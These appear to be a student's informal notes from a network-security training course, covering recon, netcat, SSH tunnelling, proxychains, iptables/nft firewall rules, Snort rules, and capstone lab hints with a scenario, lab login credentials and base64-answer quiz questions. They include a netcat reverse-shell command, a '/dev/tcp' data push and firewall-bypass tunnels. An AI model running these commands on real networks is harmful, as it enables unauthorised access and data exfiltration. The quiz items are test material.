

Import Socket: 
  s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
    FAMILY Constants = AF_INET, AF_INET6,AF_UNIX
    TYPE Constants = SOCK_STREAM,SOCK_DGRAM,SOCK_RAW
    PROTO Constants = 0,IPPROTO_RAW
if you are going to create a tunnel and need to connect a socket through, change the ipaddr to the loopback and the port will be high number port on the tunnel.


Socket types:
  Stream : 
    connection orieneted and sequences; methods for connection establishment and tear-down, used with tcp,sctp,and bluetooth (protocol not needed)
  Datagram:
    connectionless; designed for quickly sending and receiving data, used with upp (Protocol not needed)
  Raw:
    Direct sending and receiving of ip packets without automatic protocol-specific formatting




------------------------------------------------------------------

4 types of recon
  active
      
  passive
      gathering info without direct interaction
      lower risk of discovery
      not as straight forward and requieres more time than active
      trying to find IP addresses and subdomains, external and 3rd party sites, people and technologies, content of interest, vulnerabilities
      whois queries, job site listings, phone numbers, google searches, passive OS fingerprinting
  internal
      sitting inside trying to find more shit inside the network
      packet sniffers ie. tcpdump, wireshark (internal passive)
      dns queries, arp reqests (internal active)
  external
      generally the start, from outside the target system
      OSINT (external passive)
          resolving hostnames to ip addresses, rfc 3912, WHOIS queries  
            DIG:
              typically between primary and secondary dns servers
              if allowed to transfer externally hostnames, IPs and IP blocks can be determined

network scanning
 #linux   for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
 #Windows for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
   
  21-23,80
  remote to local
    pen testing
  local to remote
    illegal
  local to local
    network admins
  remote to remote
    checking a lotta shit at once
    don't worry about it
  aim:
    wide range target scan
    target specific scan
  method:
    how you're scanning
    single source scan
    distributed scan

  idle scan uses zombie IP, uses another person's IP (that ou have to specify  to do the scan

  find open ports with nmap then use netcat to verify
      echo " ' | nc -v <ip> <port number>




host discover
  nmap, nc, scan scrpt, ping sweep
port discovery
  nmap, nc
port validation
  banner grabbing using nc
follow on actions based on ports found
  if 22 or 23 CONNECT and PASSIVE RECON
  IF 21 or 80 wget -r IP_ADDRESS **OR** wget -r ftp://IP_ADDRESS **OR** firefox
      eom or eog to open them


scan methodology
quick scan 21-23, 80
specific ports based on hints/clues
well knows
chinks of 2000 or first 10000
hail mary, (65535)
-----------------------------------------------------------------

day 5) 

transfering data - tftp, ftp (active/passive), sftp like ftp but with encryption of ssh, ftps, 

ftp <ip> | anonymous(free account on it if enabled) 
 wget -r <ip> | wget -r ftp://<ip>:<port> 

scp <location> <desination>
remote | scp student@<ip>: <file path> <where i want it> 
local | <where its located> student@<ip> :<where you want it> 
remote to remote | scp -3 student@<ip> :<what you want> student@<ip>:<where you want it>



port forward | scp -P 1111 student@localhost:file  <where you want it> 


netcat 
--------------
listning port must be made first 


listner
--------------
nc <ip> <port> < file.txt
nc -l -p 9001 > newfile.txt 
---------------------------
client relay 
-----------
mknod mypipe p (or) mkfifo <name> 

listners 
-------------
nc -l -l 9002 < infile (sends info) 
nc -l -p 9001 > outfile (recieves info) 


tunneling
______________________
creates ssh, then tells what port to go through 

send traffic
-----------------
nc -l -p 1111 > file.txt
cat file.txt > /dev/tcp/<ip>/<port>

requesting a shell
----------------------
nc -c /bin/sh <your ip> <any unfilterd port> 
nc -l -p <port that was unfiltered> -vvv

ssh local port forwarding
-------------------------
                                        (or host name) 
ssh -p <optional alternate port> <user>@<ip> -L <myport>: target:<Target port> -NT 

ex) ssh student@172.16.82.106 -L 1111:localhost:80 -NT (a way to access a private web server this host only has access too. if its an active webserver) 

ssh student@172.16.1.15 -L 1111:172.16.40.10:22
ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 

        (9050)
ssh -D <port> -p <alt port> user@povit ip -NT   (use a 3rd praty software to figure it out; proxychains) any tcp protocoal can  be used, only forwards tcp traffic 
ex) ssh student@172.16.82.106 -D 9050 -nt 

on my box) proxychains ./network (network scan) 
          porxychains ssh student@<ip> -p


proxychains curl ftp://www.onlineftp.ch
proxychains wget -r www.espn.com
proxychains ./network

ssh student@10.10.0.40 -R 1111:localhost: 80 -nt (bypassing firewall to get traffic) 

ss -ntlp (view ports on your loop back) ss -antp (established ports)
------------------------------------------------------

search commands 
----------------------
find / -name hint* 2> /dev/null

find / -name flag* 2> /dev/null


----------------------------------------------------------------------
day ?)

/etc/p0f/p0f.fp

wireshark 
---------------
protocol high archy click as apply as filter

tcpdump -r <file>
tcpdump -r <file> tcp[13] = 0x02 | sort | uniq -c 

sudo p0f -r wget.pcap -o /var/log/p0f.log 
alert = log data 
sensors = in-line, passive
methods= tap, span, arp spoofing(MitM)

IOA - passive 


IOC - reactive 

--------------------------------------------------------------

day 6?)

network traffic filtering 
-----------------------------
(firewalls)
-----------
host: ex) windows definder 
network: on interfaces effecting the whole network
proxy:  layer 3-7
switch: layer 2/3 
router: layer 3-4
ids and ips: layer 3-7
host baised firewall: 3-7

whitelist: default is explicit deny 
blacklist: default is explicit allow 

network device modes: 
routed (router) 
transparent (copies and forwards it through) 
firewall: stateless(onepacket L 3/4), statefull inspection(L4), application fkters(layer7)
firewall: to block everything everythin going to the internal network 


iptables: -A append -I insert at top  -L list -P change defult policy -p protocol -d dest addr -s src addr -j jump to target action -n port number vice -t specifies a specific filter 

nft add table [family] [table] chain {type [type] hook [hook] priority [priority]\; policy [policy] \;}         Ex) 

sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT (allows ssh through fire wall) 
sudo iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT(allows ssh out through the firewall) 
sudo iptables -P INPUT DROP 
sudo iptables -P OUTPUT DROP
sudo iptables -A INPUT -p tcp -m multiport --ports 22,23,80 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp -m multiport --ports 22,23,80 -j ACCEPT


iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to 1.1.1.1:8080
iptables -t nat -A PREROUTING -o eth0 -j DNAT --to 10.0.0.1:8080

snat= post routing 
dnat= pre routing output
masquerade= post routing 



NFT (ipv6 and ipv4) 
----------------
sudo nft add table ip CCTC 
sudo nft add chain ip <same name> <chain name> { type filter hook input priority 0 \; policy accept\; } 

sudo nft add rule ip <table name> <chain name> <protocal> <dport|sport> { ssh,telnet,http }
sudo nft add rule ip <table name> <chain name> <protocal> <dport|sport> { ssh,telnet,http }




external interface: genaric rules on first firewall
ids&ips: right at the exit of th external

----------------------------------------------------------------------------------------------------------------
day 8) 

IDS AND IPS
--------------------------------------------
snort
----------
action protocol (source ip ) (src port) (dst ip) (dst port) msg; reference; sid; rev; classtype; priority; metadata; content; |hex|; nocase; depth (how far); distance; within; offset;

/etc/snort

snort examples
----------------------
sudo snort -D -c /etc/snort/snort.conf -l /var/log/snort
sudo snort -r <file> 

(string)  aleart tcp any any -> any 21 (msg:"anonymous ftp login"; content: "anonymous"; sid: 123456;)
(offset)  aleart tcp any any -> any 21 (msg:"anonymous ftp login"; content: "anonymous"; offset:5; sid:123456;)
(ping sweep)  alert icmp any any -> 140.1.0.2 any (msg: "nmap"; dsize:0; sid:123456; rev: 1;) 
(hex)  alert tcp any any -> any any (msg: "noOP"; content: "|9090 9090 9090|"; sid: 789456;)
(bad telent login)  alert tcp anmy 23 -> any any (msg: "telent bad login"; content: "Login incorrect"; flow: established,from_server; classtype:bad-unknown; sid 741852; rev: 6; ) 


alert tcp any any -> any any (msg: "check ping"; content: "IDSRulecheck"; sid: 123456;) 













































T2 & T4 
----------------------------------
sudo nft add table ip CCTC
sudo nft add chain ip CCTC OUTPUT { type filter hook output priority 0 \; policy accept \;}
sudo nft add rule CCTC INPUT ct state { established, new } tcp sport { ssh, telnet, 3389 } accept 
sudo nft add rule CCTC INPUT ct state { established, new } tcp dport { ssh, telnet, 3389 } accept
sudo nft add rule CCTC INPUT icmp type { echo-reply, echo-request } ip saddr { 10.10.0.40 } accept
sudo nft add rule CCTC INPUT icmp type { echo-reply, echo-request } ip daddr { 10.10.0.40 } accept
sudo nft add rule CCTC INPUT tcp sport { mmcc, 5150 } accept
sudo nft add rule CCTC INPUT tcp dport { mmcc, 5150 } accept 
sudo nft add rule CCTC INPUT udp sport { mmcc, 5150 } accept
sudo nft add rule CCTC INPUT udp dport { mmcc, 5150 } accept
sudo nft add rule CCTC INPUT tcp sport { 80 } accept
sudo nft add rule CCTC INPUT tcp dport { 80 } accept






T1 & T3 
-----------------------------------
sudo iptables -t filter -A INPUT -p tcp -m multiport --ports 22,23,3389 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -t filter -A INPUT -p tcp -m multiport --ports 80 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -t filter -A INPUT -p tcp -m multiport --ports  6579,4444 -j ACCEPT
sudo iptables -t filter -A INPUT -p udp -m multiport --ports  6579,4444 -j ACCEPT
sudo iptables -t filter -A INPUT -s 10.10.0.40 -p icmp --icmp-type echo-request -j ACCEPT
sudo iptables -t filter -A INPUT -s 10.10.0.40 -p icmp --icmp-type echo-reply -j ACCEPT
sudo iptables -t filter -A INPUT -d 10.10.0.40 -p icmp --icmp-type echo-request -j ACCEPT
sudo iptables -t filter -A INPUT -d 10.10.0.40 -p icmp --icmp-type echo-reply -j ACCEPT


sudo iptables -t filter -A OUTPUT -p tcp -m multiport --ports 22,23,3389 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -t filter -A OUTPUT -p tcp -m multiport --ports 80 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -t filter -A OUTPUT -p tcp -m multiport --ports  6579,4444 -j ACCEPT
sudo iptables -t filter -A OUTPUT -p udp -m multiport --ports  6579,4444 -j ACCEPT
sudo iptables -t filter -A OUTPUT -s 10.10.0.40 -p icmp --icmp-type echo-request -j ACCEPT
sudo iptables -t filter -A OUTPUT -s 10.10.0.40 -p icmp --icmp-type echo-reply -j ACCEPT
sudo iptables -t filter -A OUTPUT -d 10.10.0.40 -p icmp --icmp-type echo-request -j ACCEPT
sudo iptables -t filter -A OUTPUT -d 10.10.0.40 -p icmp --icmp-type echo-reply -j ACCEPT





hint on 10.50.44.211
-----------------------
You are on this workstation as Jose Cuervo, a local strongman. You have the ability to execute commands on this Pineland workstation as an actor for Pineland. Jose has a friend in Atropia that has provided him with the ability to SSH to the Allies' pivot point. You (Jose) should look into providing intel on other interesting workstations in the area controlled by Keith Mohammand, a wanted terrorist. Those workstations are not directly reachable from Atropia, but are on the same subnet as Jose's workstation which may be used to exfiltrate information. Jose also has a flag that can be found by using the find command on his system. The directory where the flag is found has been commonly used throughout the network.



The flag is the PDU for UDP at the transport layer.

 number 10 ssh 
 --------------------------------------
net4_comrade18
privet18


ssh net4_student18@localhost -p 41810 -L 41820:192.168.0.40:5555 -NT
 ssh  net4_student18@localhost -p 41820 -L 41830:172.16.0.60:23 -NT
 use telent
ssh net4_student18@192.168.0.40 -p 5555 -R 41840:localhost:22 -NT
ssh net4_student18@localhost -p 41820 -L 41850:localhost:41840 -NT
ssh net4_comrade18@localhost -p 41850 -D 9050 -NT






sudo nft add rule NAT POSTROUTING ip saddr 192.168.3.30 oif eth0 masquerade


hints for the capstone. 
-----------------------
/usr/share/cctc
range 4180-41899


Go through each of the 5 questions on this website and be prepared to write the answer at an alternate location.
-------------------------------------------------------------------------------------------------------------------------

1) APIPA uses the IP network range of 169.254.0.0/16. What RFC number governs this? Enter only the BASE64 conversion of the number.

2) IPv6 Uses SLAAC to resolve its Global address from the Router. What multicast destination address does it use to Solicit the router? Enter the address in uppercase and convert to BASE64.

3) which type of ARP is sent in order to perform a MitM attack? Specify the answer in ALL CAPS and convert to BASE64.

4) An attacker built a FRAME that looks like this:

| Destination MAC | Source MAC | 0x8100 | 1 | 0x8100 | 100 | 0x0800 | IPv4 Header | TCP Header | Data | FCS |

  What form of attack is being performed? Supply your answer in ALL CAPS and convert to BASE64.

5) A router receives a 5000 byte packet on eth0. The MTU for the outbound interface (eth1) is 1500. What would the fragmentation offset increment be with the conditions below?
    Origional packet Size = 5000 bytes
    MTU for outboud interface = 1500
    Packet IHL = 7
   Supply only the BASE64 conversion of the number.


--------------------------------------------------------------------------------------------------------------------------------
pcap questions
---------------
To answer these 4 questions, you will need to use tcpdump and BPF's against the capstone-bpf.pcap file.


Question 1:

Using BPF’s, determine how many packets with a DSCP of 26 being sent to the host 10.0.0.103.

Provide the number of packets converted to BASE64.


Question 2:

What is the total number of fragmented packets?

Provide the number of packets converted to BASE64.



Question 3:

How many packets have the DF flag set and has ONLY the RST and FIN TCP Flags set?

Provide the number of packets converted to BASE64.



Question 4:

An attacker is targeting the host 10.0.0.104 with either a TCP full or half open scan. Based off the pcap, how many ports are open?

Provide the number of ports converted to BASE64.




